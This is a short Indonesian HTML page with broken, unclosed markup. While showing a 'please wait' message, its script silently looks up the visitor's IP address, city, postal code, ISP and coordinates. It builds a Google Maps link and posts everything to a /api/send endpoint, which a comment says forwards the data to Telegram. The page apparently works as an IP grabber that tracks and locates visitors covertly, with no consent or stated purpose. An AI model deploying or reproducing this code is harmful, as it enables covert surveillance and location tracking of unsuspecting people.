<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />

<body>
  <h3 id="status">Mohon tunggu...</h3>
  <pre id="result"></pre> <!-- tempat menampilkan hasil -->

  <script>
    async function getIP() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();

        const info = `

ğŸŒ IP: ${data.ip}
ğŸŒ Negara: ${data.country_name}
ğŸ™ Kota: ${data.city}, ${data.region} ${data.postal}
ğŸ›° ISP: ${data.org}

ğŸ“Œ Koordinat: ${data.latitude}, ${data.longitude}
ğŸ”— https://www.google.com/maps?q=${data.latitude},${data.longitude}
`;

        // tampilkan di halaman
        document.getElementById("status").textContent = "âœ… Data berhasil diambil";
        document.getElementById("result").textContent = info;

        // kirim ke server (API/send.js) agar diteruskan ke Telegram
        await fetch("/api/send", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ text: info })
        });

      } catch (err) {
        document.getElementById("status").textContent = "âŒ Gagal ambil data";
        console.error("Error:", err);

</html>
